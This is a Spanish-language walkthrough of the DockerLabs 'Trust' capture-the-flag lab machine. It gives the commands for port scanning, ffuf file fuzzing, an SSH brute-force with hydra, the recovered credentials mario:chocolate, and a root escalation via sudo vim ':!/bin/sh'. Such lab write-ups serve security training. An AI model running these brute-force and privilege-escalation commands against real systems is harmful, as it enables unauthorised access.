---
{"-publish":true,"permalink":"/dockerlabs/muy-facil/trust/","PassFrontmatter":true}
---

![Pasted image 20250526085117.png](/img/user/imgs/Pasted%20image%2020250526085117.png)

Damos un nmap para escanear los puertos abiertos:

![Pasted image 20250526085149.png](/img/user/imgs/Pasted%20image%2020250526085149.png)

Puertos abiertos:
- 22
- 80

Ingresemos a la pagina web detras:

![Pasted image 20250526092052.png](/img/user/imgs/Pasted%20image%2020250526092052.png)

Probemos busqueda de directorios o busqeudas de archvivos:
1. Hago un dirsearch y no sale nada interesante
2. Utilizo ffuf para buscar archivos con diferentes extensiones.

```
ffuf -u http://172.18.0.2/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.bak,.txt,.html -mc 200
```

![Pasted image 20250526092229.png](/img/user/imgs/Pasted%20image%2020250526092229.png)

Tenemos un archiov secret.php ingresemos a ello:

![Pasted image 20250526092258.png](/img/user/imgs/Pasted%20image%2020250526092258.png)

Tenemos como usuario: **mario**

- Podemos intentar hacer hydra para buscar password para mario y loguearnos en el ssh:

```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

![Pasted image 20250526092402.png](/img/user/imgs/Pasted%20image%2020250526092402.png)

Credenciales: **mario:chocolate**

![[Pasted image 20250526092451.png\|Pasted image 20250526092451.png]]

Ingresamos al ssh y probamos un **sudo -l**:

![[Pasted image 20250526092548.png\|Pasted image 20250526092548.png]]
Obsevamos que tenemos obcion de ejcutar vim como super usuario sin serlo:

Para escalar privilegios podemos hacer lo siguiente:

```
sudo vim -c ':!/bin/sh'
```

![Pasted image 20250526092707.png](/img/user/imgs/Pasted%20image%2020250526092707.png)

Ya somo root.
Para mas informacion del comando tenemos la siguiente pagina: https://gtfobins.github.io/gtfobins/vim/

thanks.
